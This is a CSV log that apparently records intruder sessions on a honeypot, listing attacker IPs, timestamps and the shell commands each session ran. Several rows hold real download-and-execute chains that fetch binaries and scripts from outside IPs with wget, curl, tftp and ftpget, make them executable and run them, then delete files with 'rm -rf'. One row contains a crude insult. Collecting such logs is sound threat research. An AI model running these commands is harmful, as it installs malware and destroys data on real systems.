attackdate,attackerip,entrancetime,exittime,commands
2021-11-08,10.0.3.93,18:40:58.713,18:41:01.324,"['cat /etc/issue', 'cd /tmp/', 'rm -rf x86*', 'wget http://179.43.175.58/x86_64', 'chmod 777 *', './x86_64 x8666', 'echo Suck my dick.']"
2021-11-03,10.0.3.67,19:18:08.291,19:19:10.306,['scp -t /tmp/PNdLHHxu']
2021-10-28,10.0.3.85,19:39:03.556,19:53:13.082,"['sudo hive-passwd dayone1edfjqiyhnh3', 'sudo pkill Xorg', 'uname -a']"
2021-10-31,10.0.3.44,19:43:29.149,19:43:50.624,['scp -t /tmp/Sg3UjyL7']
2021-11-06,10.0.3.103,20:28:40.408,20:29:42.466,[]
2021-10-28,10.0.3.54,20:08:42.857,20:56:50.083,['uname -a']
2021-10-28,10.0.3.114,21:18:42.189,21:55:28.608,"['cd /tmp  cd /var/run  cd /mnt  cd /root  cd /', 'wget http://192.3.185.234/run.sh', 'curl -O http://192.3.185.234/run.sh', 'chmod 777 run.sh', 'sh run.sh', 'tftp 192.3.185.234 -c get run.sh', 'chmod 777 run.sh', 'sh run.sh', 'tftp -r run2.sh -g 192.3.185.234', 'chmod 777 run2.sh', 'sh run2.sh', 'ftpget -v -u anonymous -p anonymous -P 21 192.3.185.234 run1.sh run1.sh', 'sh run1.sh', 'rm -rf run.sh run.sh run2.sh run1.sh', 'rm -rf *']"
2021-11-06,10.0.3.248,21:47:35.491,21:47:35.979,[]
2021-11-08,10.0.3.206,21:51:43.281,21:51:59.053,"['ls', '[ETX]exit']"
2021-11-09,10.0.3.190,21:39:21.122,21:39:41.279,['scp -t /tmp/UfVRJY3p']
2021-10-28,10.0.3.33,22:58:23.110,22:58:48.759,['scp -t /tmp/EvEKEpx8']
